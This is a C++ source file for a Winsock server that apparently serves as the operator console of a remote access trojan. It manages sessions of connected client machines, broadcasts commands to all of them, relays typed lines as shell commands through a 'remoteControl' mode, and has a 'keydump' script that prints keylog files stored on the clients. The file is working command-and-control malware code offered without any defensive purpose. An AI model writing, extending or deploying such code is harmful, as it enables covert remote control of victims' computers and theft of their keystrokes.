#include "Server.h"
#include <process.h>

Server* Server::serverptr; //Serverptr is necessary so the static ClientHandler method can access the server instance/functions.

Server::Server(int PORT, bool BroadcastPublically) //Port = port to broadcast on. BroadcastPublically = false if server is not open to the public (people outside of your router), true = server is open to everyone (assumes that the port is properly forwarded on router settings)
{
	//Winsock Startup
	WSAData wsaData;
	WORD DllVersion = MAKEWORD(2, 1);
	if (WSAStartup(DllVersion, &wsaData) != 0) //If WSAStartup returns anything other than 0, then that means an error has occured in the WinSock Startup.
	{
		MessageBoxA(NULL, "WinSock startup failed", "Error", MB_OK | MB_ICONERROR);
		exit(1);
	}

	if (BroadcastPublically) //If server is open to public
		addr.sin_addr.s_addr = htonl(INADDR_ANY);
	else //If server is only for our router
		addr.sin_addr.s_addr = inet_addr("127.0.0.1"); //Broadcast locally
	addr.sin_port = htons(PORT); //Port
	addr.sin_family = AF_INET; //IPv4 Socket

	sListen = socket(AF_INET, SOCK_STREAM, NULL); //Create socket to listen for new connections
	if (bind(sListen, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) //Bind the address to the socket, if we fail to bind the address..
	{
		std::string ErrorMsg = "Failed to bind the address to our listening socket. Winsock Error:" + std::to_string(WSAGetLastError());
		MessageBoxA(NULL, ErrorMsg.c_str(), "Error", MB_OK | MB_ICONERROR);
		exit(1);
	}
	if (listen(sListen, SOMAXCONN) == SOCKET_ERROR) //Places sListen socket in a state in which it is listening for an incoming connection. Note:SOMAXCONN = Socket Oustanding Max connections, if we fail to listen on listening socket...
	{
		std::string ErrorMsg = "Failed to listen on listening socket. Winsock Error:" + std::to_string(WSAGetLastError());
		MessageBoxA(NULL, ErrorMsg.c_str(), "Error", MB_OK | MB_ICONERROR);
		exit(1);
	}
	serverptr = this;
    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)PacketSenderThread, NULL, NULL, NULL); //Create thread that will manage all outgoing packets
}

void Server::ListenForNewConnection()
{
    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ListenerThread, NULL, NULL, NULL); //Create thread that will manage all outgoing packets
}

void Server::HandleInput()
{
	std::string userinput;
	int inputInt;
	currentSessionID = -1;
	while (true)
	{
		std::getline(std::cin, userinput);

		if (currentSessionID == -1)			//handle command while not having selected a client
		{
			if (General::processParameter(userinput, "connect"))
			{
				inputInt = atoi(userinput.c_str());
				int tempInt = connections.size() - 1;
				if (inputInt > tempInt)
					General::outputMsg("Session doesn't exist.", 2);
				else
				{
					currentSessionID = inputInt;
					General::outputMsg("Connected to Session " + std::to_string(currentSessionID), 1);
				}
				inputInt = 0;
				userinput.empty();
			}
			else if (General::processParameter(userinput, "broadcast"))		//broadcasts commands to all clients
			{
				General::outputMsg("Entering broadcast mode. To disable, type 'exitSession'", 1);
				currentSessionID = -2;
			}
			else if (General::processParameter(userinput, "listClients"))	//counts clients (TODO: list clients)
			{
				if (connections.size() <= 0)
				{
					General::outputMsg("No Clients connected", 2);
				}
				else
				{
					General::outputMsg("Listing all Clients, Connected: " + std::to_string(connections.size()), 1);
				}
			}
			else
				General::outputMsg("Please connect to a session with 'connect'", 2);
		}


		else						//handle command when client is selected
		{
			if (userinput == "exitSession")
			{
				General::outputMsg("Exited Session " + std::to_string(currentSessionID), 1);
				currentSessionID = -1;
			}

			else if (General::processParameter(userinput, "switchSession"))
			{
				inputInt = atoi(userinput.c_str());
				int tempInt = connections.size() - 1;
				if (inputInt > tempInt)
					General::outputMsg("Session doesn't exist.", 2);
				else
				{
					currentSessionID = inputInt;
					General::outputMsg("Switched to Session " + std::to_string(currentSessionID), 1);
				}
				inputInt = 0;
				userinput.empty();
			}

			else if (userinput.find("remoteControl") != std::string::npos)
			{
				General::cmdMode = !General::cmdMode;
				SendString(currentSessionID, userinput, PacketType::Instruction);
			}
			else if (General::processParameter(userinput, "script"))
			{
				handleScript(userinput);
			}
			else if (General::cmdMode)
			{
				SendString(currentSessionID, userinput, PacketType::CMDCommand);
			}
			else
			{
				SendString(currentSessionID, userinput, PacketType::Instruction);
			}
		}
	}
}

void Server::handleScript(std::string script)		//temporary, will implement client-side version
{
	General::outputMsg("Executing script", 1);

	SendString(currentSessionID, (std::string)"remoteControl cmd", PacketType::Instruction);
	Sleep(2000);
	if (General::processParameter(script, "keydump"))
	{
		General::outputMsg("Dumping Keylogs from " + script, 1);
		SendString(currentSessionID, "type " + script, PacketType::CMDCommand);
	}
	else
	{
		General::outputMsg("Script not recognized", 2);
	}

	SendString(currentSessionID, (std::string)"remoteControl", PacketType::Instruction);
}

bool Server::ProcessPacket(int ID, PacketType _packettype)
{
	switch (_packettype)
	{

	case PacketType::Instruction: //Packet Type: chat message
	{
		std::string message; //string to store our message we received
		if (!GetString(ID, message)) //Get the chat message and store it in variable: Message
			return false; //If we do not properly get the chat message, return false
						  //Next we need to send the message out to each user
		General::outputMsg("ID [" + std::to_string(ID) + "]: " + message, 1);
		break;
	}

	case PacketType::CMDCommand:
	{
		std::string message; //string to store our message we received
		if (!GetString(ID, message)) //Get the chat message and store it in variable: Message
			return false; //If we do not properly get the chat message, return false
						  //Next we need to send the message out to each user

		General::outputMsg(message, 3);

		break;
	}

	case PacketType::Warning:
	{
		std::string message; //string to store our message we received
		if (!GetString(ID, message)) //Get the chat message and store it in variable: Message
			return false; //If we do not properly get the chat message, return false
						  //Next we need to send the message out to each user
		General::outputMsg("ID [" + std::to_string(ID) + "]: " + message, 2);
		break;
	}

	case PacketType::FileTransferRequestFile:
	{
		std::string FileName; //string to store file name
		if (!GetString(ID, FileName)) //If issue getting file name
			return false; //Failure to process packet

		connections[ID]->file.infileStream.open(FileName, std::ios::binary | std::ios::ate); //Open file to read in binary | ate mode. We use ate so we can use tellg to get file size. We use binary because we need to read bytes as raw data
		if (!connections[ID]->file.infileStream.is_open()) //If file is not open? (Error opening file?)
		{
			std::cout << "Client: " << ID << " requested file: " << FileName << ", but that file does not exist." << std::endl;
			return true;
		}

		connections[ID]->file.fileName = FileName; //set file name just so we can print it out after done transferring
		connections[ID]->file.fileSize = connections[ID]->file.infileStream.tellg(); //Get file size
		connections[ID]->file.infileStream.seekg(0); //Set cursor position in file back to offset 0 for when we read file
		connections[ID]->file.fileOffset = 0; //Update file offset for knowing when we hit end of file

		if (!HandleSendFile(ID)) //Attempt to send byte buffer from file. If failure...
			return false;
		break;
	}
	case PacketType::FileTransferRequestNextBuffer:
	{
		if (!HandleSendFile(ID)) //Attempt to send byte buffer from file. If failure...
			return false;
		break;
	}
	default: //If packet type is not accounted for
	{
		std::cout << "Unrecognized packet: " << (int32_t)_packettype << std::endl; //Display that packet was not found
		break;
	}
	}
	return true;
}

bool Server::HandleSendFile(int ID)
{
	if (connections[ID]->file.fileOffset >= connections[ID]->file.fileSize) //If end of file reached then return true and skip sending any bytes
		return true;
	if (!SendPacketType(ID, PacketType::FileTransferByteBuffer)) //Send packet type for file transfer byte buffer
		return false;

	connections[ID]->file.remainingBytes = connections[ID]->file.fileSize - connections[ID]->file.fileOffset; //calculate remaining bytes
	if (connections[ID]->file.remainingBytes > connections[ID]->file.buffersize) //if remaining bytes > max byte buffer
	{
		connections[ID]->file.infileStream.read(connections[ID]->file.buffer, connections[ID]->file.buffersize); //read in max buffer size bytes
		if (!Sendint32_t(ID, connections[ID]->file.buffersize)) //send int of buffer size
			return false;
		if (!sendall(ID, connections[ID]->file.buffer, connections[ID]->file.buffersize)) //send bytes for buffer
			return false;
		connections[ID]->file.fileOffset += connections[ID]->file.buffersize; //increment fileoffset by # of bytes written
	}
	else
	{
		connections[ID]->file.infileStream.read(connections[ID]->file.buffer, connections[ID]->file.remainingBytes); //read in remaining bytes
		if (!Sendint32_t(ID, connections[ID]->file.remainingBytes)) //send int of buffer size
			return false;
		if (!sendall(ID, connections[ID]->file.buffer, connections[ID]->file.remainingBytes)) //send bytes for buffer
			return false;
		connections[ID]->file.fileOffset += connections[ID]->file.remainingBytes; //increment fileoffset by # of bytes written
	}

	if (connections[ID]->file.fileOffset == connections[ID]->file.fileSize) //If we are at end of file
	{
		if (!SendPacketType(ID, PacketType::FileTransfer_EndOfFile)) //Send end of file packet
			return false;
		//Print out data on server details about file that was sent
		std::cout << std::endl << "File sent: " << connections[ID]->file.fileName << std::endl;
		std::cout << "File size(bytes): " << connections[ID]->file.fileSize << std::endl << std::endl;
	}
	return true;
}

void Server::ClientHandlerThread(int ID) //ID = the index in the SOCKET connections array
{
	PacketType packettype;
	while (true)
	{
		if (!serverptr->GetPacketType(ID, packettype)) //Get packet type
			break; //If there is an issue getting the packet type, exit this loop
		if (!serverptr->ProcessPacket(ID, packettype)) //Process packet (packet type)
			break; //If there is an issue processing the packet, exit this loop
	}
	std::cout << "Lost connection to client ID: " << ID << std::endl;
	serverptr->DisconnectClient(ID); //Disconnect this client and clean up the connection if possible
	return;
}

void Server::PacketSenderThread() //Thread for all outgoing packets
{
	while (true)
	{
		for (size_t i = 0; i < serverptr->connections.size(); i++) //for each connection...
		{
			if (serverptr->connections[i]->pm.HasPendingPackets()) //If there are pending packets for this connection's packet manager
			{
				Packet p = serverptr->connections[i]->pm.Retrieve(); //Retrieve packet from packet manager
				if (!serverptr->sendall(i, p.buffer, p.size)) //send packet to connection
				{
					std::cout << "Failed to send packet to ID: " << i << std::endl; //Print out if failed to send packet
				}
				delete p.buffer; //Clean up buffer from the packet p
			}
		}
		Sleep(5);
	}
}

void Server::ListenerThread()
{
	while (true)
	{
		SOCKET newConnectionSocket = accept(serverptr->sListen, (SOCKADDR*)&serverptr->addr, &serverptr->addrlen); //Accept a new connection
		if (newConnectionSocket == 0) //If accepting the client connection failed
		{
			std::cout << "Failed to accept the client's connection." << std::endl;
		}
		else //If client connection properly accepted
		{
			std::lock_guard<std::mutex> lock(serverptr->connectionMgr_mutex); //Lock connection manager mutex since we are adding an element to connection vector
			int NewConnectionID = serverptr->connections.size(); //default new connection id to size of connections vector (we will change it if we can reuse an unused connection)
			if (serverptr->UnusedConnections > 0) //If there is an unused connection that this client can use
			{
				for (size_t i = 0; i < serverptr->connections.size(); i++) //iterate through the unused connections starting at first connection
				{
					if (serverptr->connections[i]->ActiveConnection == false) //If connection is not active
					{
						serverptr->connections[i]->socket = newConnectionSocket;
						serverptr->connections[i]->ActiveConnection = true;
						NewConnectionID = i;
						serverptr->UnusedConnections -= 1;
						break;
					}
				}
			}
			else //If no unused connections available... (add new connection to the socket)
			{
				std::shared_ptr<Connection> newConnection(new Connection(newConnectionSocket));
				serverptr->connections.push_back(newConnection); //push new connection into vector of connections
			}
			std::cout << "Client Connected! ID:" << NewConnectionID << " | IP: " << inet_ntoa(serverptr->addr.sin_addr) << std::endl;
            _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ClientHandlerThread, (LPVOID)(NewConnectionID), NULL, NULL); //Create Thread to handle this client. The index in the socket array for this thread is the value (i).
		}
	}
}

void Server::DisconnectClient(int ID) //Disconnects a client and cleans up socket if possible
{
	currentSessionID = -1;
	std::lock_guard<std::mutex> lock(connectionMgr_mutex); //Lock connection manager mutex since we are possible removing element(s) from the vector
	if (connections[ID]->ActiveConnection == false) //If connection has already been disconnected?
	{
		return; //return - this should never happen, but just in case...
	}
	connections[ID]->pm.Clear(); //Clear out all remaining packets in queue for this connection
	connections[ID]->ActiveConnection = false; //Update connection's activity status to false since connection is now unused
	closesocket(connections[ID]->socket); //Close the socket for this connection
	if (ID == (connections.size() - 1)) //If last connection in vector.... (we can remove it)
	{
		connections.pop_back(); //Erase last connection from vector
								//After cleaning up that connection, check if there are any more connections that can be erased (only connections at the end of the vector can be erased)

		for (size_t i = connections.size() - 1; i >= 0 && connections.size() > 0; i--)
		{
			if (connections[i]->ActiveConnection) //If connection is active we cannot remove any more connections from vector
				break;
			//If we have not broke out of the for loop, we can remove the current indexed connection
			connections.pop_back(); //Erase last connection from vector
			UnusedConnections -= 1;
		}
	}
	else
	{
		UnusedConnections += 1;
	}
}